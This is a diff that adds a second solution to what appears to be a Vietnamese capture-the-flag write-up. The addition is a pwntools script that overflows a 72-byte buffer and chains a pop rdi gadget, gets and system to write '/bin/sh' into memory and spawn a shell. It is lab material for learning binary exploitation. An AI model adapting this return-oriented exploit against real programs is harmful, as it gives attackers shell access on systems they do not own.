@@ -128,3 +128,25 @@ r.interactive()
 
 </details>
 
+# cách 2:
+> do người ta có hàm system trong file rồi nên ta có thể nhảy vào hàm system lun
+
+<details> <summary> script </summary> 
+
+```python
+context.binary = exe
+
+pop_rdi = 0x0000000000400703
+
+payload = b'A'*72
+payload += flat(
+    pop_rdi, 0x00000000601a00,      # pop_rdi và mình dùng hàm gets để ghi vào vùng nhớ được phép ghi 0x0060100 để lưu /bin/sh
+    exe.plt['gets'],
+    pop_rdi, 0x00000000601a00,      # pop_rdi và trỏ đến địa chỉ lưu /bin/sh và thực thi
+    exe.plt['system'],
+    )
+r.sendlineafter(b"our program: ", payload)
+r.sendline(b'/bin/sh\0')
+```
+
+</details>
